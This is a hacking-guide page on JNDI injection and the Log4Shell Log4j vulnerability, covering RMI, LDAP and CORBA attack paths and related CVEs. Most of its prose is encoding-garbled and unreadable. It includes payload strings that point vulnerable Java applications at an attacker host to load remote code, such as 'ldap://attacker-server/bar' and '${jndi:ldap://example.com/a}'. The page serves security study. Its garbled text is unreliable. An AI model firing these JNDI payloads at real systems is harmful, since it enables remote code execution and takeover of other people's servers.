# JNDI - Java Naming and Directory Interface & Log4Shell

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

JNDI, —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∏–π —É Java –∑ –∫—ñ–Ω—Ü—è 1990-—Ö, —Å–ª—É–≥—É—î —Å–ª—É–∂–±–æ—é –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, —â–æ –¥–æ–∑–≤–æ–ª—è—î Java-–ø—Ä–æ–≥—Ä–∞–º–∞–º –∑–Ω–∞—Ö–æ–¥–∏—Ç–∏ –¥–∞–Ω—ñ –∞–±–æ –æ–±'—î–∫—Ç–∏ —á–µ—Ä–µ–∑ —Å–∏—Å—Ç–µ–º—É —ñ–º–µ–Ω. –í—ñ–Ω –ø—ñ–¥—Ç—Ä–∏–º—É—î —Ä—ñ–∑–Ω—ñ —Å–ª—É–∂–±–∏ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —á–µ—Ä–µ–∑ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—ñ–≤ –ø–æ—Å–ª—É–≥ (SPI), —â–æ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∑ —Ä—ñ–∑–Ω–∏—Ö —Å–∏—Å—Ç–µ–º, –≤–∫–ª—é—á–∞—é—á–∏ –≤—ñ–¥–¥–∞–ª–µ–Ω—ñ Java-–æ–±'—î–∫—Ç–∏. –ó–∞–≥–∞–ª—å–Ω—ñ SPI –≤–∫–ª—é—á–∞—é—Ç—å CORBA COS, Java RMI Registry —Ç–∞ LDAP.

### JNDI Naming Reference

Java-–æ–±'—î–∫—Ç–∏ –º–æ–∂—É—Ç—å –∑–±–µ—Ä—ñ–≥–∞—Ç–∏—Å—è —Ç–∞ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é JNDI Naming References, —è–∫—ñ –º–∞—é—Ç—å –¥–≤—ñ —Ñ–æ—Ä–º–∏:

* **Reference Addresses**: –í–∫–∞–∑—É—î –Ω–∞ –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, _rmi://server/ref_), —â–æ –¥–æ–∑–≤–æ–ª—è—î –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—î –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∑ –≤–∫–∞–∑–∞–Ω–æ—ó –∞–¥—Ä–µ—Å–∏.
* **Remote Factory**: –ü–æ—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π –∫–ª–∞—Å —Ñ–∞–±—Ä–∏–∫–∏. –ü—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –∫–ª–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è —Ç–∞ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –∑ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –º—ñ—Å—Ü—è.

–û–¥–Ω–∞–∫ —Ü–µ–π –º–µ—Ö–∞–Ω—ñ–∑–º –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –≤ –∑–ª–æ–≤–º–∏—Å–Ω–∏—Ö —Ü—ñ–ª—è—Ö, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É. –Ø–∫ –∫–æ–Ω—Ç—Ä–∑–∞—Ö–æ–¥–∏:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∑ JDK 7u21, –æ–±–º–µ–∂—É—é—á–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤. –ú–µ–Ω–µ–¥–∂–µ—Ä –±–µ–∑–ø–µ–∫–∏ –¥–æ–¥–∞—Ç–∫–æ–≤–æ –æ–±–º–µ–∂—É—î —Ç–µ, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∑ JDK 6u141, 7u131, 8u121, –±–ª–æ–∫—É—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö Java-–æ–±'—î–∫—Ç—ñ–≤. –Ø–∫—â–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `true`, –º–æ–∂–ª–∏–≤–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –∫–æ–¥—É –±–µ–∑ –∫–æ–Ω—Ç—Ä–æ–ª—é –ú–µ–Ω–µ–¥–∂–µ—Ä–∞ –±–µ–∑–ø–µ–∫–∏.
* **CORBA**: –ù–µ –º–∞—î —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–æ—ó –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, –∞–ª–µ –ú–µ–Ω–µ–¥–∂–µ—Ä –±–µ–∑–ø–µ–∫–∏ –∑–∞–≤–∂–¥–∏ –∞–∫—Ç–∏–≤–Ω–∏–π.

–û–¥–Ω–∞–∫ **Naming Manager**, –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–∏–π –∑–∞ —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è JNDI –ø–æ—Å–∏–ª–∞–Ω—å, –Ω–µ –º–∞—î –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö –º–µ—Ö–∞–Ω—ñ–∑–º—ñ–≤ –±–µ–∑–ø–µ–∫–∏, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –æ–±'—î–∫—Ç–∏ –∑ –±—É–¥—å-—è–∫–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞. –¶–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ä–∏–∑–∏–∫, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞—Ö–∏—Å—Ç–∏ RMI, LDAP —Ç–∞ CORBA –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±—ñ–π–¥–µ–Ω—ñ, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö Java-–æ–±'—î–∫—Ç—ñ–≤ –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —ñ—Å–Ω—É—é—á–∏—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ–≤ –ø—Ä–æ–≥—Ä–∞–º–∏ (–≥–∞–¥–∂–µ—Ç—ñ–≤) –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É.

–ü—Ä–∏–∫–ª–∞–¥–∏ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö URL –≤–∫–ª—é—á–∞—é—Ç—å:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

–ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –∑–∞—Ö–∏—Å—Ç, –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è, –≥–æ–ª–æ–≤–Ω–∏–º —á–∏–Ω–æ–º —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –∑–∞–ø–æ–±—ñ–∂–Ω–∏–∫—ñ–≤ –ø—Ä–æ—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è JNDI –∑ –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª —Ç–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ–±—ñ–π—Ç–∏ —ñ—Å–Ω—É—é—á—ñ –∑–∞—Ö–∏—Å—Ç–∏.

### JNDI Example

![](<../../.gitbook/assets/image (1022).png>)

–ù–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –≤—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ **`PROVIDER_URL`**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ —ñ–Ω—à–∏–π –ø—ñ–¥ —á–∞—Å –ø–æ—à—É–∫—É, —ñ –≤—ñ–Ω –±—É–¥–µ –¥–æ—Å—Ç—É–ø–Ω–∏–π: `ctx.lookup("<attacker-controlled-url>")`, —ñ —Å–∞–º–µ —Ü–µ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ –∑ —Å–∏—Å—Ç–µ–º–∏, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ—ó –Ω–∏–º.

### CORBA Overview

CORBA (Common Object Request Broker Architecture) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **Interoperable Object Reference (IOR)** –¥–ª—è —É–Ω—ñ–∫–∞–ª—å–Ω–æ—ó —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤. –¶–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –º—ñ—Å—Ç–∏—Ç—å –≤–∞–∂–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫:

* **Type ID**: –£–Ω—ñ–∫–∞–ª—å–Ω–∏–π —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –¥–ª—è —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É.
* **Codebase**: URL –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∫–ª–∞—Å—É-—Å—Ç—É–±–∞.

–í–∞—Ä—Ç–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ CORBA –Ω–µ —î –≤—Ä–∞–∑–ª–∏–≤–∏–º –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º. –ó–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –∑–∞–∑–≤–∏—á–∞–π –≤–∫–ª—é—á–∞—î:

* –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è **–ú–µ–Ω–µ–¥–∂–µ—Ä–∞ –±–µ–∑–ø–µ–∫–∏**.
* –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ú–µ–Ω–µ–¥–∂–µ—Ä–∞ –±–µ–∑–ø–µ–∫–∏ –¥–ª—è –¥–æ–∑–≤–æ–ª—É –∑'—î–¥–Ω–∞–Ω—å –∑ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —à–∫—ñ–¥–ª–∏–≤–∏–º–∏ –∫–æ–¥–æ–≤–∏–º–∏ –±–∞–∑–∞–º–∏. –¶–µ –º–æ–∂–Ω–∞ –¥–æ—Å—è–≥—Ç–∏ —á–µ—Ä–µ–∑:
* –î–æ–∑–≤—ñ–ª –Ω–∞ —Å–æ–∫–µ—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* –î–æ–∑–≤–æ–ª–∏ –Ω–∞ —á–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, –∞–±–æ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ (`permission java.io.FilePermission "<<ALL FILES>>", "read";`), –∞–±–æ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, –¥–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ —Ä–æ–∑–º—ñ—â–µ–Ω—ñ —à–∫—ñ–¥–ª–∏–≤—ñ —Ñ–∞–π–ª–∏.

–û–¥–Ω–∞–∫ –¥–µ—è–∫—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—ñ–≤ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –º'—è–∫–∏–º–∏ —ñ –¥–æ–∑–≤–æ–ª—è—Ç–∏ —Ü—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.

### RMI Context

–î–ª—è RMI (Remote Method Invocation) —Å–∏—Ç—É–∞—Ü—ñ—è –¥–µ—â–æ —ñ–Ω—à–∞. –Ø–∫ —ñ –∑ CORBA, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–ª–∞—Å—ñ–≤ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –æ–±–º–µ–∂–µ–Ω–µ. –©–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ RMI, –∑–∞–∑–≤–∏—á–∞–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ–±—ñ–π—Ç–∏ –ú–µ–Ω–µ–¥–∂–µ—Ä–∞ –±–µ–∑–ø–µ–∫–∏, —â–æ —Ç–∞–∫–æ–∂ —î –∞–∫—Ç—É–∞–ª—å–Ω–∏–º —É CORBA.

### LDAP

–ü–æ-–ø–µ—Ä—à–µ, –ø–æ—Ç—Ä—ñ–±–Ω–æ —Ä–æ–∑—Ä—ñ–∑–Ω—è—Ç–∏ –ø–æ—à—É–∫ —ñ –ø–æ—à—É–∫ –∑–∞ —ñ–º–µ–Ω–µ–º.\
**–ü–æ—à—É–∫** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ URL, —è–∫-–æ—Ç `ldap://localhost:389/o=JNDITutorial`, —â–æ–± –∑–Ω–∞–π—Ç–∏ –æ–±'—î–∫—Ç JNDITutorial –∑ LDAP-—Å–µ—Ä–≤–µ—Ä–∞ —Ç–∞ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –π–æ–≥–æ –∞—Ç—Ä–∏–±—É—Ç–∏**.\
**–ü–æ—à—É–∫ –∑–∞ —ñ–º–µ–Ω–µ–º** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è **—Å–ª—É–∂–± —ñ–º–µ–Ω**, –æ—Å–∫—ñ–ª—å–∫–∏ –º–∏ —Ö–æ—á–µ–º–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ **–≤—Å–µ, —â–æ –ø—Ä–∏–≤'—è–∑–∞–Ω–æ –¥–æ —ñ–º–µ–Ω—ñ**.

–Ø–∫—â–æ –ø–æ—à—É–∫ LDAP –±—É–≤ –≤–∏–∫–ª–∏–∫–∞–Ω–∏–π –∑ **SearchControls.setReturningObjFlag() –∑ `true`, —Ç–æ –ø–æ–≤–µ—Ä–Ω–µ–Ω–∏–π –æ–±'—î–∫—Ç –±—É–¥–µ —Ä–µ–∫–æ–Ω—Å—Ç—Ä—É–π–æ–≤–∞–Ω–æ**.

–û—Ç–∂–µ, —ñ—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –∞—Ç–∞–∫—É–≤–∞—Ç–∏ —Ü—ñ –æ–ø—Ü—ñ—ó.\
**–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –æ—Ç—Ä—É—ó—Ç–∏ –∑–∞–ø–∏—Å–∏ LDAP, –≤–≤–æ–¥—è—á–∏ –≤ –Ω–∏—Ö –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è**, —è–∫—ñ –±—É–¥—É—Ç—å –≤–∏–∫–æ–Ω–∞–Ω—ñ –≤ —Å–∏—Å—Ç–µ–º–∞—Ö, —â–æ —ó—Ö –∑–±–∏—Ä–∞—é—Ç—å (–¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è **–∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó –¥–µ—Å—è—Ç–∫—ñ–≤ –º–∞—à–∏–Ω**, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ LDAP-—Å–µ—Ä–≤–µ—Ä–∞). –Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü–µ - –≤–∏–∫–æ–Ω–∞—Ç–∏ **–∞—Ç–∞–∫—É MitM –ø—ñ–¥ —á–∞—Å –ø–æ—à—É–∫—É LDAP**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥.

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—É—Å–∏—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫ —Ä–æ–∑–≤'—è–∑–∞—Ç–∏ JNDI LDAP URL**, –≤–∏ –º–æ–∂–µ—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ LDAP, —è–∫–∏–π –±—É–¥–µ —à—É–∫–∞—Ç–∏—Å—è, —ñ –≤–∏ –º–æ–≥–ª–∏ –± –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –Ω–∞–∑–∞–¥ –µ–∫—Å–ø–ª–æ–π—Ç (log4shell).

#### Deserialization exploit

![](<../../.gitbook/assets/image (275).png>)

**–ï–∫—Å–ø–ª–æ–π—Ç —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π** —ñ –±—É–¥–µ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π.\
–Ø–∫—â–æ `trustURLCodebase` –¥–æ—Ä—ñ–≤–Ω—é—î `true`, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –Ω–∞–¥–∞—Ç–∏ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ –∫–ª–∞—Å–∏ –≤ –∫–æ–¥–æ–≤—ñ–π –±–∞–∑—ñ, —è–∫—â–æ –Ω—ñ, –π–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –≥–∞–¥–∂–µ—Ç–∞–º–∏ –≤ classpath.

#### JNDI Reference exploit

–õ–µ–≥—à–µ –∞—Ç–∞–∫—É–≤–∞—Ç–∏ —Ü–µ–π LDAP, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **JavaFactory references**:

![](<../../.gitbook/assets/image (1059).png>)

## Log4Shell Vulnerability

–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î –≤ Log4j, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –ø—ñ–¥—Ç—Ä–∏–º—É—î [**—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π —Å–∏–Ω—Ç–∞–∫—Å–∏—Å**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) —É —Ñ–æ—Ä–º—ñ `${prefix:name}`, –¥–µ `prefix` —î –æ–¥–Ω–∏–º –∑ –∫—ñ–ª—å–∫–æ—Ö —Ä—ñ–∑–Ω–∏—Ö [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html), —è–∫—ñ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –æ—Ü—ñ–Ω–µ–Ω—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, `${java:version}` - —Ü–µ –ø–æ—Ç–æ—á–Ω–∞ –≤–µ—Ä—Å—ñ—è Java.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) –≤–≤—ñ–≤ —Ñ—É–Ω–∫—Ü—ñ—é `jndi` Lookup. –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –∑–º—ñ–Ω–Ω—ñ —á–µ—Ä–µ–∑ JNDI. –ó–∞–∑–≤–∏—á–∞–π –∫–ª—é—á –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø—Ä–µ—Ñ—ñ–∫—Å—É—î—Ç—å—Å—è `java:comp/env/`. –û–¥–Ω–∞–∫, —è–∫—â–æ —Å–∞–º –∫–ª—é—á –º—ñ—Å—Ç–∏—Ç—å **":"**, —Ü–µ–π —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π –ø—Ä–µ—Ñ—ñ–∫—Å –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è.

–ü—Ä–∏ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ **:** –≤ –∫–ª—é—á—ñ, —è–∫ —É `${jndi:ldap://example.com/a}`, –Ω–µ–º–∞—î **–ø—Ä–µ—Ñ—ñ–∫—Å–∞**, —ñ **LDAP-—Å–µ—Ä–≤–µ—Ä –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è –¥–ª—è –æ–±'—î–∫—Ç–∞**. –Ü —Ü—ñ Lookups –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è —è–∫ —É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó Log4j, —Ç–∞–∫ —ñ –ø—ñ–¥ —á–∞—Å –∑–∞–ø–∏—Å—É —Ä—è–¥–∫—ñ–≤.

–û—Ç–∂–µ, —î–¥–∏–Ω–µ, —â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE - —Ü–µ **–≤—Ä–∞–∑–ª–∏–≤–∞ –≤–µ—Ä—Å—ñ—è Log4j, —â–æ –æ–±—Ä–æ–±–ª—è—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**. –Ü –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞, —è–∫–∞ —à–∏—Ä–æ–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è Java-–¥–æ–¥–∞—Ç–∫–∞–º–∏ –¥–ª—è –≤–µ–¥–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó (–≤–∫–ª—é—á–∞—é—á–∏ –¥–æ–¥–∞—Ç–∫–∏, —â–æ –≤–∏—Ö–æ–¥—è—Ç—å –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç), –±—É–ª–æ –¥—É–∂–µ –ø–æ—à–∏—Ä–µ–Ω–æ –º–∞—Ç–∏ log4j, —â–æ –≤–µ–¥–µ –∂—É—Ä–Ω–∞–ª, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ User-Agent. –û–¥–Ω–∞–∫ log4j **–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ª–∏—à–µ –¥–ª—è –≤–µ–¥–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ HTTP-—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, –∞ –¥–ª—è –±—É–¥—å-—è–∫–æ–≥–æ –≤–≤–µ–¥–µ–Ω–Ω—è** —Ç–∞ –¥–∞–Ω–∏—Ö, —è–∫—ñ –≤–∫–∞–∑–∞–≤ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫.

## Overview of Log4Shell-Related CVEs

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**

–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —î –∫—Ä–∏—Ç–∏—á–Ω–æ—é **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é –Ω–µ–Ω–∞–¥—ñ–π–Ω–æ—ó –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó** –≤ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ `log4j-core`, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ –≤–µ—Ä—Å—ñ—ó –∑ 2.0-beta9 –¥–æ 2.14.1. –í–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î **–≤—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É (RCE)**, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–∏. –ü—Ä–æ–±–ª–µ–º—É –ø–æ–≤—ñ–¥–æ–º–∏–≤ –ß–µ–Ω –ß–∂–∞–æ—Ü–∑—é–Ω—å –∑ –∫–æ–º–∞–Ω–¥–∏ –±–µ–∑–ø–µ–∫–∏ Alibaba Cloud —ñ –≤–æ–Ω–∞ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ä—ñ–∑–Ω—ñ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∏ Apache. –ü–æ—á–∞—Ç–∫–æ–≤–µ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —É –≤–µ—Ä—Å—ñ—ó 2.15.0 –±—É–ª–æ –Ω–µ–ø–æ–≤–Ω–∏–º. –ü—Ä–∞–≤–∏–ª–∞ Sigma –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É –¥–æ—Å—Ç—É–ø–Ω—ñ ([–ü—Ä–∞–≤–∏–ª–æ 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [–ü—Ä–∞–≤–∏–ª–æ 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Critical]**

